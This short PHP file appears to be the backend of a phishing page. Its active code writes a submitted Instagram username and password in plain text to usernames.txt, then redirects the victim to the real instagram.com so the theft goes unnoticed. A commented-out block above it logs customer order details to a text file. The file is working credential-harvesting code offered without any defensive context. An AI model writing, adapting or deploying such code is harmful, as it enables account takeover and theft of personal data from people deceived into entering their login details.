<?php
/*$data = "Name: " . $_POST['name'] . "\n" .
        "Phone: " . $_POST['phone'] . "\n" .
        "Email: " . $_POST['email'] . "\n" .
        "Address: " . $_POST['address'] . "\n" .
        "City: " . $_POST['city'] . "\n" .
        "Product ID: " . $_POST['product_id'] . "\n" .
        "Landmark: " . $_POST['landmark'] . "\n" .
        "Alt Phone: " . $_POST['alt_phone'] . "\n" .
        "--------------------------\n";

file_put_contents("orders.txt", $data, FILE_APPEND);

echo "✅ Order submitted successfully!"; */
?>


<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
